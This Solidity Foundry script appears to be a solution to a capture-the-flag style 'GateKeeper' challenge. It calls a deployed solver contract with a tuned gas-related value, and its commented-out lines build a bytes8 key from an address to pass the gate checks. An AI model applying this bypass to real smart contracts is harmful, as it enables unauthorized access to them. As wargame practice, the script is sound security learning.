pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GateKeeper.sol";
contract GateKeeperScript is Script {
    function run() external {
        vm.startBroadcast();
        // console.log(uint16(uint160(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707)));
        // address instance = address(0x38BA81BF015233A82449514bB5eB58b5D43F9059);
        // uint256 x = 0xf707;
        // bytes8 t = bytes8(bytes32(x));
        // instance.call{value: 0}(abi.encodeWithSignature("enter(bytes8)", t));
        // address(0x2B5756e6E8d9555f8ED789E14AE45aa0338d6ca7).call{value: 0}(abi.encodeWithSignature("exp(uint256)", 10000));
        GateKeeperSolver g = GateKeeperSolver(0x494B8508281E2e3c40018b05bED1e6be86EDF803);
        // g.exp(24832);
        // for (uint i = 24832; i >= 24632; i--) {
            g.exp(24829);
        // }
    }
}